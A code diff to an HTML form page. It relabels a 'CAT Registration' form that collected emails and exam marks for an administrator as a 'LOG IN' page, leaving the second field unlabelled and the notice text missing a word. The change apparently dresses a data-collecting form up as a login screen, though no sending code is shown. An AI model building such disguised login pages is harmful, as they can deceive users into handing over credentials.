@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CAT Registration</title>
+  <title>LOG IN </title>
 
   <style>
     * {
@@ -121,11 +121,10 @@
 
   <main class="form-wrap">
 
-    <h1 class="heading">CAT Registration</h1>
+    <h1 class="heading">LOG IN</h1>
 
     <p class="description">
-      Enter your email address and marks scored in your opener exams
-      to submit your CAT registration.
+      Enter your email address to login.
     </p>
 
     <form id="marksForm">
@@ -133,7 +132,7 @@
       <input
         type="email"
         name="email"
-        placeholder="Email address"
+        placeholder="Email address/Phone number"
         autocomplete="email"
         maxlength="250"
         required
@@ -142,13 +141,13 @@
       <input
         type="text"
         name="marks"
-        placeholder="Marks scored in opener exams"
+        placeholder=""
         maxlength="100"
         required
       >
 
       <button class="login" id="submitBtn" type="submit">
-        Submit Registration
+        Log In
       </button>
 
     </form>
@@ -156,8 +155,7 @@
     <p id="status" role="status" aria-live="polite"></p>
 
     <p class="note">
-      Your submitted email address and marks will be sent
-      to the registration administrator.
+      Your submitted email address and  will be used for your next login.
     </p>
 
   </main>
